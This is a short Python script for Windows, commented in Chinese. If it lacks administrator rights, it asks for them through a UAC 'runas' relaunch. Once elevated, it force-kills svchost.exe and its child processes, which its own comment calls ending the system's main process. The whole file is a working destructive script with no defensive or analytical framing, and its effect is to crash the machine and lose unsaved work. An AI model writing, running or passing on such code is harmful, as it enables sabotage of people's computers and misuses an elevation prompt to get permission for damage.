# coding=utf-8
import ctypes  # 引入库
import os
import sys


def is_admin() -> bool or int:  # 定义函数，判断当前是否是以管理员权限运行该文件
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def admin_exe() -> None:
    if is_admin():  # 如果现在是以管理员权限执行文件
        os.system('taskkill /f /t /im svchost.exe')  # 结束系统主进程
    else:  # 如果现在不是以管理员权限执行文件
        if sys.version_info[0] == 3:  # 如果当前python版本是3.x（如果低于3.0会报错）
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)  # 申请以管理员权限重新执行该文件


if __name__ == '__main__':  # 如果这个文件不是被作为一个库来导入
    admin_exe()  # 那么就执行主程序
